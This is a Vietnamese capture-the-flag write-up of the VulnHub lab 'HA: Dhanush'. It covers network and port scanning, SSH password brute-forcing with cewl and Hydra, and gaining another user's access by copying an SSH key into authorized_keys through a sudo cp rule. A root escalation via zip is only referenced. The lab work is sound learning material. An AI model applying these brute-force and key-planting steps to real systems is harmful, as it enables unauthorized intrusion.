## Giới thiệu
Hôm nay trời khá là lạnh, hình như là lạnh nhất từ lúc mùa đông ghé qua thủ đô Hà Nội. Sáng quấn chăn đến 7h sáng mới dậy. Dậy chơi vài tựa game 8-bit ngày xưa khá là kỷ niệm. Lâu rồi cũng không build bài lab nào lên làm thử. Thử tải 1 bài về chơi xem sao. Lần này vẫn là bài trên https://www.vulnhub.com/. Chọn ngẫu nhiên 1 bài thử xem trình độ mình đến đâu :joy::joy::joy:

Lần này sẽ là 1 bài đến từ [Hacking Aricles](https://www.vulnhub.com/author/hacking-articles,642/) có tên là [HA: DHANUSH
](https://www.vulnhub.com/entry/ha-dhanush,396/), mức độ cũng là vừa phải. 

Thôi không linh tinh luyên thuyên nữa, vào vấn đề chính nào

## Let's go
### Recon
Scan mạng 1 phát xem bài lab của mình đang chạy ở ip nào.

Lần này mình dùng [Netdiscover](https://www.howtoinstall.co/en/ubuntu/xenial/netdiscover) scan cho nhanh. Tool này có sẵn trên Kali, Ubuntu thì cần phải cài thêm, cũng rất dễ cài thôi ^^.

```bash
 Currently scanning: 192.168.41.0/16   |   Screen View: Unique Hosts                                    
                                                                                                        
 52 Captured ARP Req/Rep packets, from 36 hosts.   Total size: 3120                                     
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.19.110  00:0c:29:22:66:8b      1      60  VMware, Inc.                                         
```

Quét ra được ip với MAC Address trùng khớp với cái máy ảo của mình rồi. Vào thử xem web có gì không nào.

![](https://images.viblo.asia/53c7fe9c-37c3-4cc3-b917-15d2c43e6d20.png)

Cũng chẳng có gì trong này cả, có mỗi quả template khá đẹp :scream:, loanh quanh 1 hồi thử sử dụng [Gobuster](https://viblo.asia/p/do-tham-website-web-reconnaissance-tools-1-gobuster-ORNZq4DMK0n) mà bạn Nghĩa đã chia sẻ ở đây xem có gì giấu giấu trong web này không.

```bash
➜  ~ gobuster dir -u http://192.168.19.110 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -l 10
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.19.110
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Show length:    true
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2019/12/07 15:09:50 Starting gobuster
===============================================================
/images (Status: 301) [Size: 317]
/assets (Status: 301) [Size: 317]
/server-status (Status: 403) [Size: 279]
===============================================================
2019/12/07 15:17:12 Finished
===============================================================
```
Cũng chẳng có gì ở đây cả, thử quét [nmap](https://nmap.org/) xem có còn dịch vụ nào đang chạy trên server này không.

```bash
➜  ~ nmap -p- -A 192.168.19.110 
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-07 15:14 +07
Nmap scan report for 192.168.19.110
Host is up (0.0031s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HA: Dhanush
65345/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:2f:3d:dd:ac:42:d4:d5:de:ec:9b:19:0b:45:3e:13 (RSA)
|   256 89:02:8d:a5:e0:75:a5:34:3b:52:3a:6c:d1:f4:05:da (ECDSA)
|_  256 ea:af:62:07:73:d0:d5:1e:fb:a9:12:62:34:27:52:d9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.61 seconds
```

Ở đây chúng ta có thể thấy rằng server này chỉ chạy có 2 dịch vụ là dịch vụ web (Apache httpd 2.4.29) ở cổng 80 và ssh ở cổng 65345
![](https://images.viblo.asia/aeaa7255-1b74-4e28-b662-83e0f6185774.gif)

Sao ssh bình thường mở cổng 22 mà ở đây mở ở cổng 65345 làm gì nhỉ, điều này làm mình tập trung vào phần dịch vụ ssh này hơn so với dịch vụ web.
### Attack
Cũng chẳng có nhiều thông tin gì về dịch vụ ssh này, thôi thì dùng Hydra bruteforce thử xem thế nào. Vẫn như các bài lab khác, ở Kali có tool [cewl](https://tools.kali.org/password-attacks/cewl) dùng để đọc dữ liệu của trang web, rồi trả về 1 danh sách các từ xuất hiện trong website đó để làm wordlist :joy:

```bash
➜  ~ cewl 192.168.19.110 > pass.txt
➜  ~ wc -l pass.txt 
115 pass.txt
```

Thử nhét vào Hydra xem sao 
```
➜  ~ hydra -L pass.txt -P pass.txt 192.168.19.110 ssh -s 65345 
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-12-07 15:30:04
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 13225 login tries (l:115/p:115), ~827 tries per task
[DATA] attacking ssh://192.168.19.110:65345/
[STATUS] 152.07 tries/min, 2281 tries in 00:15h, 10949 to do in 01:13h, 16 active
```
Chạy lâu thật sự, không khả thi tý nào. Giờ mình phải biết được user để đăng nhập ssh, mở lại website thì thấy được tên của 3 cây cung. Thử lấy tên 3 cây cung đấy làm username xem sao.
Vậy ta sẽ có 
```bash
➜  ~ cat user.txt                              
sharang
pinak
gandiv
```
(Ban đầu còn ngáo ngáo để cả tên viết hoa cơ :joy::joy:)
![](https://images.viblo.asia/18769a6a-d46f-427c-a64b-d8180353321a.png)

**Correct!**

Thử đăng nhập vào xem có gì không nào
![](https://images.viblo.asia/4b005e84-77a7-4229-a111-262538e623cb.png)

Đúng là như mình dự đoán, có 3 users đấy thật :joy::joy:

User **pinak** có thể sử dụng lệnh cp với user **sarang** 

![](https://images.viblo.asia/f71a1433-4d1a-4f51-8ec5-8f977093eadd.png)

Kịch bản sẽ là như thế này, giờ mình phải generate khóa ssh-key, rồi copy khóa này vào thư mục .ssh của user **sarang**, lúc đấy mình sẽ đăng nhập với user **sarang** bằng cái khóa mà mình copy vào. Vậy là ta có thể đăng nhập được vào **sarang**

![](https://images.viblo.asia/d50b4a64-ffda-4dd8-8558-7478856a68d2.png)

```bash
pinak@ubuntu:~/.ssh$ chmod 777 id_rsa.pub 
pinak@ubuntu:~/.ssh$ sudo -u sarang cp id_rsa.pub /home/sarang/.ssh/authorized_keys
cp: cannot stat 'id_rsa.pub': Permission denied
```
Loay hoay mãi k hiểu tại sao lại **Permission denied**. Hóa ra là phải copy cái file `id_rsa.pub` ra ngoài folder `.ssh` rồi mới thực hiện copy được.

![](https://images.viblo.asia/7e480a50-d203-4b80-bf0b-242e9fb303d8.png)

**Correct!**

Bây giờ mình có thể sử dụng khóa này để đăng nhập với quyền là của **sarang** rồi.

![](https://images.viblo.asia/ece0b30e-926a-47e0-bd20-22d61d81b70a.png)

![](https://images.viblo.asia/2ff305a0-e125-412f-9079-81c94543dfad.png)

### Privilege Escalation

Search google 1 hồi ra bài này [Linux for Pentester : ZIP Privilege Escalation
](https://www.hackingarticles.in/linux-for-pentester-zip-privilege-escalation/). Làm theo thôi :D

![](https://images.viblo.asia/f7a53aeb-1be0-4071-835b-af32a3e59d72.png)

**Correct!**
```bash
root@ubuntu:/root# cat flag.txt 
          
                                            @p
                                           @@@.
                                          @@@@@
                                         @@@@@@@
                                        *"`]@P ^^
                                           ]@P
                                           ]@P
                               ,,,,        ]@P       ,,gg,,
                           g@@@@@@@@@b     ]@P    ,@@@@@@@@@@g,
                        ,@@@@@@BNPPNB@@@@@@@@@@@@@@@@P**PNB@@@@@w
                      g@@@@P^`        %NNNNN@NNNNNP          *B@@@g
                    g@@@P`                 -@                   "B@@w
                  ,@@@`                    ]@                      %@@,
                 @@P-                      ]@                        *@@,
              ,@@"                         ]@                          *B@
            ,@N"                          y@@B                            %@,
      ,,  g@P-                            ]@@@P                             *Bg ,gg
      @@@@$,,,,,,,,,,,,,,,,,,,,,,,,,,ggggg@@@@wwwwwwwwwgggggggggww==========mm4NNN"

!! Congrats you have finished this task !!		
							
Contact us here:						
								
Hacking Articles : https://twitter.com/rajchandel/		
Nisha Sharma     : https://in.linkedin.com/in/nishasharmaa			
								
+-+-+-+-+-+ +-+-+-+-+-+-+-+					
 |E|n|j|o|y| |H|A|C|K|I|N|G|			
 +-+-+-+-+-+ +-+-+-+-+-+-+-+						
____________________________________

root@ubuntu:/root# 
```

## End
Cảm ơn 1 bài labs khá là hay của Hacking Articles : https://twitter.com/rajchandel/. Mình đã học được nhiều điều ở đây, còn các bạn thì sao, cho mình 1 upvote và 1 comment nhé ^^.